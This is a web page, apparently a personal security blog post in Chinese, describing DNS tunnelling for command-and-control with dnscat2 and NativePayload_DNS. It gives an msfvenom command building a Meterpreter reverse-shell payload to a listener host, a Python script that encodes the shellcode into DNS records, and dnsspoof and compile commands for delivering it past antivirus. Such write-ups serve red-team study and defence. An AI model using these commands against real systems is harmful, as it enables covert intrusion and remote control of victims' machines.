@@ -1,0 +1,348 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="极客兔兔的小站，致力于分享一些技术教程和有趣的技术实践。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="基于常规DNS隧道通信利用">
+<meta property="og:url" content="https://c1y2m3.github.io/2019/07/01/%E5%9F%BA%E4%BA%8E%E5%B8%B8%E8%A7%84DNS%E9%9A%A7%E9%81%93%E9%80%9A%E4%BF%A1%E5%88%A9%E7%94%A8/index.html">
+<meta property="og:site_name" content="c1y2m3&#39;s blog">
+<meta property="og:description" content="极客兔兔的小站，致力于分享一些技术教程和有趣的技术实践。">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://c1y2m3.oss-cn-beijing.aliyuncs.com/xx1.png">
+<meta property="og:image" content="https://c1y2m3.oss-cn-beijing.aliyuncs.com/xx2.png">
+<meta property="og:image" content="https://c1y2m3.oss-cn-beijing.aliyuncs.com/xx3.png">
+<meta property="og:image" content="https://c1y2m3.oss-cn-beijing.aliyuncs.com/xx4.png">
+<meta property="og:image" content="https://c1y2m3.oss-cn-beijing.aliyuncs.com/xx5.png">
+<meta property="og:image" content="https://c1y2m3.oss-cn-beijing.aliyuncs.com/xx6.png">
+<meta property="og:image" content="https://c1y2m3.oss-cn-beijing.aliyuncs.com/xx7.png">
+<meta property="og:image" content="https://c1y2m3.oss-cn-beijing.aliyuncs.com/xx8.png">
+<meta property="og:image" content="https://c1y2m3.oss-cn-beijing.aliyuncs.com/xx9.png">
+<meta property="og:image" content="https://www.yunzhijia.com/microblog/filesvr/5d4413156d67ff04fe362070">
+<meta property="og:image" content="https://www.yunzhijia.com/microblog/filesvr/5d44138f90144e1859abbf23">
+<meta property="og:image" content="https://www.yunzhijia.com/microblog/filesvr/5d4413fe28011f3c5371f1bb">
+<meta property="og:image" content="https://www.yunzhijia.com/microblog/filesvr/5d44140128011f3c5371f1be">
+<meta property="og:image" content="https://www.yunzhijia.com/microblog/filesvr/5d44144332f2ca7e75d544bf">
+<meta property="article:published_time" content="2019-07-01T03:51:24.000Z">
+<meta property="article:modified_time" content="2023-02-01T12:31:05.000Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://c1y2m3.oss-cn-beijing.aliyuncs.com/xx1.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>基于常规DNS隧道通信利用</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/life/">漂泊</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/c1y2m3">github</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2019/07/21/%E9%80%9A%E8%BF%87Teamviewer%E7%AA%81%E7%A0%B4%E7%9B%AE%E6%A0%87%E7%B3%BB%E7%BB%9F%E9%98%B2%E5%BE%A1/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2019/06/27/%E3%80%90%E5%9F%9F%E6%B8%97%E9%80%8F%E3%80%91Group%20Policy%20Preference/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://c1y2m3.github.io/2019/07/01/%E5%9F%BA%E4%BA%8E%E5%B8%B8%E8%A7%84DNS%E9%9A%A7%E9%81%93%E9%80%9A%E4%BF%A1%E5%88%A9%E7%94%A8/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://c1y2m3.github.io/2019/07/01/%E5%9F%BA%E4%BA%8E%E5%B8%B8%E8%A7%84DNS%E9%9A%A7%E9%81%93%E9%80%9A%E4%BF%A1%E5%88%A9%E7%94%A8/&text=基于常规DNS隧道通信利用"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://c1y2m3.github.io/2019/07/01/%E5%9F%BA%E4%BA%8E%E5%B8%B8%E8%A7%84DNS%E9%9A%A7%E9%81%93%E9%80%9A%E4%BF%A1%E5%88%A9%E7%94%A8/&title=基于常规DNS隧道通信利用"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://c1y2m3.github.io/2019/07/01/%E5%9F%BA%E4%BA%8E%E5%B8%B8%E8%A7%84DNS%E9%9A%A7%E9%81%93%E9%80%9A%E4%BF%A1%E5%88%A9%E7%94%A8/&is_video=false&description=基于常规DNS隧道通信利用"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=基于常规DNS隧道通信利用&body=Check out this article: https://c1y2m3.github.io/2019/07/01/%E5%9F%BA%E4%BA%8E%E5%B8%B8%E8%A7%84DNS%E9%9A%A7%E9%81%93%E9%80%9A%E4%BF%A1%E5%88%A9%E7%94%A8/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://c1y2m3.github.io/2019/07/01/%E5%9F%BA%E4%BA%8E%E5%B8%B8%E8%A7%84DNS%E9%9A%A7%E9%81%93%E9%80%9A%E4%BF%A1%E5%88%A9%E7%94%A8/&title=基于常规DNS隧道通信利用"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://c1y2m3.github.io/2019/07/01/%E5%9F%BA%E4%BA%8E%E5%B8%B8%E8%A7%84DNS%E9%9A%A7%E9%81%93%E9%80%9A%E4%BF%A1%E5%88%A9%E7%94%A8/&title=基于常规DNS隧道通信利用"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://c1y2m3.github.io/2019/07/01/%E5%9F%BA%E4%BA%8E%E5%B8%B8%E8%A7%84DNS%E9%9A%A7%E9%81%93%E9%80%9A%E4%BF%A1%E5%88%A9%E7%94%A8/&title=基于常规DNS隧道通信利用"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://c1y2m3.github.io/2019/07/01/%E5%9F%BA%E4%BA%8E%E5%B8%B8%E8%A7%84DNS%E9%9A%A7%E9%81%93%E9%80%9A%E4%BF%A1%E5%88%A9%E7%94%A8/&title=基于常规DNS隧道通信利用"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://c1y2m3.github.io/2019/07/01/%E5%9F%BA%E4%BA%8E%E5%B8%B8%E8%A7%84DNS%E9%9A%A7%E9%81%93%E9%80%9A%E4%BF%A1%E5%88%A9%E7%94%A8/&name=基于常规DNS隧道通信利用&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://c1y2m3.github.io/2019/07/01/%E5%9F%BA%E4%BA%8E%E5%B8%B8%E8%A7%84DNS%E9%9A%A7%E9%81%93%E9%80%9A%E4%BF%A1%E5%88%A9%E7%94%A8/&t=基于常规DNS隧道通信利用"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#DNS-Tunnel%E5%8F%AF%E4%BB%A5%E5%88%86%E4%B8%BA%E7%9B%B4%E8%BF%9E%E5%92%8C%E4%B8%AD%E7%BB%A7%E4%B8%A4%E7%A7%8D%E3%80%82"><span class="toc-number">1.</span> <span class="toc-text">DNS Tunnel可以分为直连和中继两种。</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#DNSCAT2"><span class="toc-number"></span> <span class="toc-text">DNSCAT2</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#NativePayload-DNS"><span class="toc-number"></span> <span class="toc-text">NativePayload_DNS</span></a>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        基于常规DNS隧道通信利用
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">John Doe</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2019-07-01T03:51:24.000Z" itemprop="datePublished">2019-07-01</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="DNS-Tunnel可以分为直连和中继两种。"><a href="#DNS-Tunnel可以分为直连和中继两种。" class="headerlink" title="DNS Tunnel可以分为直连和中继两种。"></a>DNS Tunnel可以分为直连和中继两种。</h2><p>直连就是用目标机器直接和指定的目标DNS Server进行UDPsocket套接字连接，这种方式速度快，但致命的弱点就是直接将IP暴露在流量中，且如果客户端指定了信任的DNS解析服务器，那么将会被白名单限制在外。</p>
+<p>中继是通过DNS迭代查询实现的中继隧道，生存能力强，隐蔽性更高，但同时因为数据包到达目标DNS Server前需要经过多个节点，所以速度上慢很多。</p>
+<p>中继过程中的一个关键点是对DNS缓存机制的规避，因为如果解析的域名在Local DNS 中已经有缓存时，Local DNS 就不会继续发送数据包。所以在构造请求中，每次查询的域名需要不同或者是已过期的。</p>
+<p><img src="https://c1y2m3.oss-cn-beijing.aliyuncs.com/xx1.png" alt="img"></p>
+<h1 id="DNSCAT2"><a href="#DNSCAT2" class="headerlink" title="DNSCAT2"></a>DNSCAT2</h1><p>DNSCAT2用于通过DNS协议创建恶意软件的命令和控制通道（C＆C）。它由用Ruby编写的服务器和用C编写的客户端组成。</p>
+<p>一开始，需要设置一个NS记录指向自己的子域名，再设置一个A记录指向自己部署server端的服务器地址。如下图的设置：</p>
+<p><img src="https://c1y2m3.oss-cn-beijing.aliyuncs.com/xx2.png" alt="img"></p>
+<p>解析配置完成后，在服务端nc监听下udp的53端口，再回到windows机器ping下ns域名,如果收到回显,证明解析成功。</p>
+<p><img src="https://c1y2m3.oss-cn-beijing.aliyuncs.com/xx3.png" alt="img"></p>
+<p>接下来，在server端开启隧道：</p>
+<p>ruby.&#x2F;dnscat2.rb dnscat.[domain] –no-cache<br>[domain]是刚设置的ns记录的子域名，–no-cache代表不进行缓存</p>
+<p><img src="https://c1y2m3.oss-cn-beijing.aliyuncs.com/xx4.png" alt="img"></p>
+<p>我们以相同的方式启动客户端，并看到会话已经建立。</p>
+<p><img src="https://c1y2m3.oss-cn-beijing.aliyuncs.com/xx5.png" alt="img"></p>
+<p>回到服务端使用shell进行命令控制:</p>
+<p><img src="https://c1y2m3.oss-cn-beijing.aliyuncs.com/xx6.png" alt="img"></p>
+<p>在客户端抓取流量包可以看到Dnscat2 主要进行了TXT,CNAME,MX查询。</p>
+<p><img src="https://c1y2m3.oss-cn-beijing.aliyuncs.com/xx7.png" alt="img"></p>
+<p>并且dnscat2客户端没有直接向我的C2服务器发送DNS查询，相反，受害者的系统正在与标准可信DNS服务器进行通信并转发至该域的权威DNS服务器，</p>
+<p>正如下捕获的数据包, 受害者的本地DNS服务器正在尝试解析“dnscat.[domain].cn”域中的主机名，</p>
+<p><img src="https://c1y2m3.oss-cn-beijing.aliyuncs.com/xx8.png" alt="img"></p>
+<h1 id="NativePayload-DNS"><a href="#NativePayload-DNS" class="headerlink" title="NativePayload_DNS"></a>NativePayload_DNS</h1><p>NativePayload_DNS 是利用DNS隧道来传输shellcode，在内存中执行，进行分离免杀，躲避杀软的静态检测。</p>
+<p>项目地址<br><a target="_blank" rel="noopener" href="https://github.com/DamonMohammadbagher/NativePayload_DNS">https://github.com/DamonMohammadbagher/NativePayload_DNS</a></p>
+<p>这里对C#脚本使用csc.exe进行编译可执行文件exe：<br>C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe &#x2F;out: Dnsbceon.exe NativePayload_DNS.cs</p>
+<p>实现原理：<br>查看c#源代码，具体分以下三步来实现分离式免杀执行shellcode，通过循环遍历请求DNS中的PTR记录，将返回的域名进行拼接提取,最终调用kernel32申请内存执行shellcode。</p>
+<p><img src="https://c1y2m3.oss-cn-beijing.aliyuncs.com/xx9.png" alt="img"></p>
+<p>首先使用MSF生成shellcode,如下:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Msfvenom --platform windows --arch x64 -p windows/x64/met</span><br><span class="line">erpreter/reverse_tcp lhost=10.10.11.134 lport=4444 -f c &gt; /root/payload.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://www.yunzhijia.com/microblog/filesvr/5d4413156d67ff04fe362070" alt="img"></p>
+<p>然后将 shellcode 制作成 IP+地址的格式<br>Ipaddress “{payload}.domain.com”<br>1.1.1.0 “0xfc0x480x830xe40xf00xe8.1.com”<br>1.1.1.1 “0xbc0xc80x130xff0x100x08.1.com”<br>……</p>
+<p>这里使用python进行格式化，结果如下:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#! /usr/bin/env python2.7</span><br><span class="line"># -*- coding:UTF-8 -*-</span><br><span class="line">a = &#x27;&#x27;</span><br><span class="line">f = open(&quot;payload.txt&quot;, &quot;rb&quot;)</span><br><span class="line">line = f.readlines()[0:]</span><br><span class="line">f.close()</span><br><span class="line">for lines in range(len(line)):</span><br><span class="line">    ipls = &#x27;1.1.1.%s&#x27; % lines</span><br><span class="line">    shellcode = line[lines].replace(&quot;;&quot;,&quot;&quot;).strip().rstrip(&#x27;&quot;&#x27;)+&quot;.1.com&quot;+&#x27;&quot;&#x27;</span><br><span class="line">    text = ipls + &quot; &quot; + &#x27;&quot;&#x27;+ &quot;0x&quot;+shellcode.lstrip(&#x27;&quot;&#x27;)</span><br><span class="line">    a += text.replace(&quot;\\&quot;,&quot;0&quot;)+&quot;\n&quot;</span><br><span class="line">fn = open(&quot;dns.txt&quot;, &quot;wb&quot;)</span><br><span class="line">fn.write(a)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://www.yunzhijia.com/microblog/filesvr/5d44138f90144e1859abbf23" alt="img"></p>
+<p>在Kali上 使用dnsspoof 创建DNS服务器，并在MSF进行监听<br>dnsspoof -i eth0 -f dns.txt</p>
+<p><img src="https://www.yunzhijia.com/microblog/filesvr/5d4413fe28011f3c5371f1bb" alt="img"></p>
+<p>通过nslookup查询可以查询到对应的shellcode</p>
+<p><img src="https://www.yunzhijia.com/microblog/filesvr/5d44140128011f3c5371f1be" alt="img"></p>
+<p>windows执行编译好的文件，由于使用DNS反向解析，速度相对来说较慢，<br>经过漫长的等待成功弹回meterpreter。</p>
+<p><img src="https://www.yunzhijia.com/microblog/filesvr/5d44144332f2ca7e75d544bf" alt="img"></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/life/">漂泊</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="http://github.com/c1y2m3">github</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#DNS-Tunnel%E5%8F%AF%E4%BB%A5%E5%88%86%E4%B8%BA%E7%9B%B4%E8%BF%9E%E5%92%8C%E4%B8%AD%E7%BB%A7%E4%B8%A4%E7%A7%8D%E3%80%82"><span class="toc-number">1.</span> <span class="toc-text">DNS Tunnel可以分为直连和中继两种。</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#DNSCAT2"><span class="toc-number"></span> <span class="toc-text">DNSCAT2</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#NativePayload-DNS"><span class="toc-number"></span> <span class="toc-text">NativePayload_DNS</span></a>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://c1y2m3.github.io/2019/07/01/%E5%9F%BA%E4%BA%8E%E5%B8%B8%E8%A7%84DNS%E9%9A%A7%E9%81%93%E9%80%9A%E4%BF%A1%E5%88%A9%E7%94%A8/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://c1y2m3.github.io/2019/07/01/%E5%9F%BA%E4%BA%8E%E5%B8%B8%E8%A7%84DNS%E9%9A%A7%E9%81%93%E9%80%9A%E4%BF%A1%E5%88%A9%E7%94%A8/&text=基于常规DNS隧道通信利用"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://c1y2m3.github.io/2019/07/01/%E5%9F%BA%E4%BA%8E%E5%B8%B8%E8%A7%84DNS%E9%9A%A7%E9%81%93%E9%80%9A%E4%BF%A1%E5%88%A9%E7%94%A8/&title=基于常规DNS隧道通信利用"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://c1y2m3.github.io/2019/07/01/%E5%9F%BA%E4%BA%8E%E5%B8%B8%E8%A7%84DNS%E9%9A%A7%E9%81%93%E9%80%9A%E4%BF%A1%E5%88%A9%E7%94%A8/&is_video=false&description=基于常规DNS隧道通信利用"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=基于常规DNS隧道通信利用&body=Check out this article: https://c1y2m3.github.io/2019/07/01/%E5%9F%BA%E4%BA%8E%E5%B8%B8%E8%A7%84DNS%E9%9A%A7%E9%81%93%E9%80%9A%E4%BF%A1%E5%88%A9%E7%94%A8/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://c1y2m3.github.io/2019/07/01/%E5%9F%BA%E4%BA%8E%E5%B8%B8%E8%A7%84DNS%E9%9A%A7%E9%81%93%E9%80%9A%E4%BF%A1%E5%88%A9%E7%94%A8/&title=基于常规DNS隧道通信利用"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://c1y2m3.github.io/2019/07/01/%E5%9F%BA%E4%BA%8E%E5%B8%B8%E8%A7%84DNS%E9%9A%A7%E9%81%93%E9%80%9A%E4%BF%A1%E5%88%A9%E7%94%A8/&title=基于常规DNS隧道通信利用"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://c1y2m3.github.io/2019/07/01/%E5%9F%BA%E4%BA%8E%E5%B8%B8%E8%A7%84DNS%E9%9A%A7%E9%81%93%E9%80%9A%E4%BF%A1%E5%88%A9%E7%94%A8/&title=基于常规DNS隧道通信利用"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://c1y2m3.github.io/2019/07/01/%E5%9F%BA%E4%BA%8E%E5%B8%B8%E8%A7%84DNS%E9%9A%A7%E9%81%93%E9%80%9A%E4%BF%A1%E5%88%A9%E7%94%A8/&title=基于常规DNS隧道通信利用"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://c1y2m3.github.io/2019/07/01/%E5%9F%BA%E4%BA%8E%E5%B8%B8%E8%A7%84DNS%E9%9A%A7%E9%81%93%E9%80%9A%E4%BF%A1%E5%88%A9%E7%94%A8/&name=基于常规DNS隧道通信利用&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://c1y2m3.github.io/2019/07/01/%E5%9F%BA%E4%BA%8E%E5%B8%B8%E8%A7%84DNS%E9%9A%A7%E9%81%93%E9%80%9A%E4%BF%A1%E5%88%A9%E7%94%A8/&t=基于常规DNS隧道通信利用"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2023
+    John Doe
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/life/">漂泊</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/c1y2m3">github</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
